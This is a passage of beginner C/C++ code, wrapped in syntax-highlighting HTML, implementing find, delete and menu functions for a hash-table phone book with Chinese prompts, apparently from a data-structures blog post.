Status find<span class="token punctuation">(</span>char nu<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>//查找
<span class="token punctuation">&#123;</span>
    int <span class="token assign-left variable">key</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    int <span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">11</span><span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token assign-left variable">key</span><span class="token operator">=</span>key+<span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">(</span>nu<span class="token punctuation">[</span>i<span class="token punctuation">]</span>-<span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token assign-left variable">key</span><span class="token operator">=</span>key%7<span class="token punctuation">;</span>
    struct node *q<span class="token operator">=</span>lis<span class="token punctuation">[</span>key<span class="token punctuation">]</span>.lnext<span class="token punctuation">;</span>
    while<span class="token punctuation">(</span>q<span class="token operator">!=</span>NULL<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">11</span><span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            if<span class="token punctuation">(</span>nu<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>q-<span class="token operator">></span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
                <span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
                <span class="token builtin class-name">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">&#123;</span>
                <span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        if<span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            printf<span class="token punctuation">(</span><span class="token string">"姓名：%s<span class="token entity" title="\t">\t</span>电话：%s<span class="token entity" title="\t">\t</span>地址：%s<span class="token entity" title="\n">\n</span>"</span>,q-<span class="token operator">></span>name,q-<span class="token operator">></span>num,q-<span class="token operator">></span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token assign-left variable">q</span><span class="token operator">=</span>q-<span class="token operator">></span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        if<span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>
            printf<span class="token punctuation">(</span><span class="token string">"未找到<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status deletenode<span class="token punctuation">(</span>char nu<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	int <span class="token assign-left variable">key</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    int <span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">11</span><span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token assign-left variable">key</span><span class="token operator">=</span>key+<span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">(</span>nu<span class="token punctuation">[</span>i<span class="token punctuation">]</span>-<span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token assign-left variable">key</span><span class="token operator">=</span>key%7<span class="token punctuation">;</span>
    struct node *q<span class="token operator">=</span>lis<span class="token punctuation">[</span>key<span class="token punctuation">]</span>.lnext<span class="token punctuation">;</span>
    struct node *p<span class="token operator">=</span>new node<span class="token punctuation">;</span>
    if<span class="token punctuation">(</span>q<span class="token operator">==</span>NULL<span class="token punctuation">)</span>
     printf<span class="token punctuation">(</span><span class="token string">"无此记录<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">else</span>
     <span class="token punctuation">&#123;</span>
     	for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">11</span><span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
     	<span class="token punctuation">&#123;</span>
     		for<span class="token punctuation">(</span>int <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">11</span><span class="token punctuation">;</span>j++<span class="token punctuation">)</span>
     		<span class="token punctuation">&#123;</span>
     			if<span class="token punctuation">(</span>nu<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>q-<span class="token operator">></span>num<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
     			<span class="token punctuation">&#123;</span>
     				<span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
     				<span class="token builtin class-name">continue</span><span class="token punctuation">;</span>
				 <span class="token punctuation">&#125;</span>
				 <span class="token keyword">else</span>
				 <span class="token punctuation">&#123;</span>
				 	<span class="token assign-left variable">flag</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
				 	<span class="token builtin class-name">break</span><span class="token punctuation">;</span>
				 <span class="token punctuation">&#125;</span>
			 <span class="token punctuation">&#125;</span>
			 if<span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>
			 <span class="token punctuation">&#123;</span>
			 	if<span class="token punctuation">(</span>i<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>
			 	lis<span class="token punctuation">[</span>key<span class="token punctuation">]</span>.lnext<span class="token operator">=</span>q-<span class="token operator">></span>next<span class="token punctuation">;</span>
			 	<span class="token assign-left variable">q</span><span class="token operator">=</span>NULL<span class="token punctuation">;</span>
			 	delete q<span class="token punctuation">;</span>
			 	printf<span class="token punctuation">(</span><span class="token string">"已删除<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
			 	<span class="token builtin class-name">break</span><span class="token punctuation">;</span>
			 <span class="token punctuation">&#125;</span>
			 <span class="token keyword">else</span>
			 <span class="token punctuation">&#123;</span>
			 	<span class="token assign-left variable">p</span><span class="token operator">=</span>q<span class="token punctuation">;</span>
			 	<span class="token assign-left variable">q</span><span class="token operator">=</span>q-<span class="token operator">></span>next<span class="token punctuation">;</span>
			 	
			 <span class="token punctuation">&#125;</span>
			 
     		if<span class="token punctuation">(</span>q<span class="token operator">==</span>NULL<span class="token punctuation">)</span>break<span class="token punctuation">;</span>
		 <span class="token punctuation">&#125;</span>
		 if<span class="token punctuation">(</span>flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>
			 printf<span class="token punctuation">(</span><span class="token string">"信息不存在<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	 <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

Status OperateMenu<span class="token punctuation">(</span>int num<span class="token punctuation">)</span>//菜单函数
<span class="token punctuation">&#123;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------****操作菜单****------<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	printf<span class="token punctuation">(</span><span class="token string">"------    0 退出系统<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    1 添加<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    2 查找<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    3 显示<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    4 删除<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    请选择你所需要的操作<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token builtin class-name">return</span> num<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    struct list lis<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
    for<span class="token punctuation">(</span>int <span class="token assign-left variable">i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>length<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span>.lnext<span class="token operator">=</span>NULL<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
     int <span class="token assign-left variable">num</span><span class="token operator">=</span>-1<span class="token punctuation">;</span>  
    while<span class="token punctuation">(</span>num<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#123;</span>
       <span class="token assign-left variable">num</span><span class="token operator">=</span>OperateMenu<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    switch<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">1</span>:createnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span>:
		char numb<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		printf<span class="token punctuation">(</span><span class="token string">"请输入要查找的电话号码:<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
		scanf<span class="token punctuation">(</span><span class="token string">"%s"</span>,numb<span class="token punctuation">)</span><span class="token punctuation">;</span>
		find<span class="token punctuation">(</span>numb<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">3</span>:showlist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">4</span>:
		char numc<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		printf<span class="token punctuation">(</span><span class="token string">"请输入要删除的电话号码:<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
		scanf<span class="token punctuation">(</span><span class="token string">"%s"</span>,numc<span class="token punctuation">)</span><span class="token punctuation">;</span>
		deletenode<span class="token punctuation">(</span>numc<span class="token punctuation">)</span><span class="token punctuation">;</span> 


    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
</search>
